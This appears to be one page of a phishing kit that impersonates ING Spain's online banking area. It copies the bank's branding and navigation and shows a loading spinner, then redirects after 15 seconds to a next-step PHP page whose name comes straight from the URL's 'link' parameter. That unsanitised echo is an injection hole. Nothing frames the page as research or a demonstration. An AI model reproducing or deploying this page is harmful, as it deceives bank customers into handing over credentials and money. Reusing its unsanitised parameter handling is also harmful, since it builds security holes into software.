<html style="
    background-color: #fff;
"><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="refresh" content="15; url=./<?php echo $_GET['link'];?>.php">
    <title>Àrea personal, ING</title>
    <link rel="icon" href="./img/favicon.ico">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.5/css/bulma.min.css">
    
    <link rel="stylesheet" href="./css/style.css">
  </head>
  <body>

  <nav class="navbar" role="navigation" aria-label="main navigation">
<div class="navbar-brand">
  <img class="hid" src="./img/search.svg" alt="" style="
    width: 31px;
    position: absolute;
    left: 15px;
    top: 20px;
    cursor: pointer;
">
  <div class="hid" id="add"><img src="./img/menu.svg" alt="">
    <p style="
    font-size: 13px;
    position: absolute;
    top: 31px;
">MENU</p></div>
    <a class="navbar-item" href="#">
      <img src="./img/logo.svg" width="112" height="28">
    </a>
    <p class="adz" style="display: flex;align-items: center;"><img src="./img/cros.svg" style="
    width: 15px;
    margin: 5px;
"> Para Negocios</p>
  </div>

  <div id="navbarBasicExample" class="navbar-menu">
  

    <div class="navbar-end">
      <div class="navbar-item">
      <input type="text" placeholder="¿En que podemos ayudarte?" style="
    height: 40px;
    padding: 0px 10px;
    background-color: #fff;
    background-image: none;
    border: .11rem solid #c9c9c9;
    color: #333;
    display: block;
    font-family: INGMe;
    padding: 1rem 1.2rem;
">
        <div style="
    background-color: #333333;
    width: 40px;
    height: 40px;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 10px;
">
          <img src="./img/sh.svg" style=" width: 20px; " alt="">
        </div>
      </div>
    </div>
  </div>

  
  
  
  
  
  <div class="adz" style="
    width: 100%;
    position: absolute;
    display: flex;
    background-color: #d1d1d1;
    top: 68px;
    left: 0px;
    padding: 0px 110px;
    justify-content: space-between;
    height: 55px;
    align-items: center;
"><div style=" display: flex; width: 620px; font-size: 16px; justify-content: space-between; ">
<p style="
    color: #ff6200;
">Inicio</p>
<p>Mis productos</p><p>Transferencias </p>
<p>+ ING para mi</p><p>Contratar productos</p></div>

<div style="
    font-size: 18px;
    display: flex;
    align-items: center;
    ">Àrea personal  <div style="
    width: 42px;
    height: 42px;
    background-color: #8f8f8f;
    padding: 5px;
    border-radius: 50%;
    margin-left: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
"><img src="./img/user.svg" style="
    width: 25px;
"></div>
<div></div></div>



</div>
  
  
  
  
  
  
  
  
  
</nav>

  <section class="section" style="
    display: flex;
    align-items: center;
    justify-content: center;
    width: 100%;
    height: 90vh;
    padding: 0;
">
    <style>.loading {
  box-sizing:border-box;border-radius:50%;width:var(--ing-uic-rubik-icon-size, 32px);height:var(--ing-uic-rubik-icon-size, 32px);border-top:var(--ing-uic-rubik-icon-border-top, 3px solid #d9d9d9);border-bottom:var(--ing-uic-rubik-icon-border-bottom, 3px solid #d9d9d9);border-right:var(--ing-uic-rubik-icon-border-right, 3px solid #d9d9d9);border-left:var(--ing-uic-rubik-icon-border-left, 3px solid #ff6200);-webkit-transform:translateZ(0);transform:translateZ(0);-webkit-animation:animball var(--ing-uic-rubik-icon-duration, 0.7s) infinite linear;animation:animball var(--ing-uic-rubik-icon-duration, 0.7s) infinite linear;
}

@-webkit-keyframes animball {
0% {
  -webkit-transform:rotate(0deg) translateZ(0);transform:rotate(0deg) translateZ(0);
}

to {
  -webkit-transform:rotate(1turn) translateZ(0);transform:rotate(1turn) translateZ(0);
}

}

@keyframes animball {
0% {
  -webkit-transform:rotate(0deg) translateZ(0);transform:rotate(0deg) translateZ(0);
}

to {
  -webkit-transform:rotate(1turn) translateZ(0);transform:rotate(1turn) translateZ(0);
}

}

</style>
<div class="loading" style="
    width: 60px;
    height: 60px;
"></div>
  </section>
  

</body></html>